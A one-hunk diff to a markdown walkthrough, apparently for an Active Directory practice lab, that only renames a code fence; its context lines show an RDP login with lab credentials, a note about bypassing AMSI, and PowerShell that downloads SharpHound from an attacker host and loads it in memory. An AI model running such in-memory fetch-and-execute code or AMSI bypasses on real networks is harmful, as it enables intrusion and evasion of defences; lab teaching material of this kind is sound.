@@ -199,7 +199,7 @@ xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
 
 - Or we could also do it in reflection with powershell if you want to play it full in memory (if you do this with defender enabled you will first have to bypass amsi)
 
-```psh
+```powershell
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
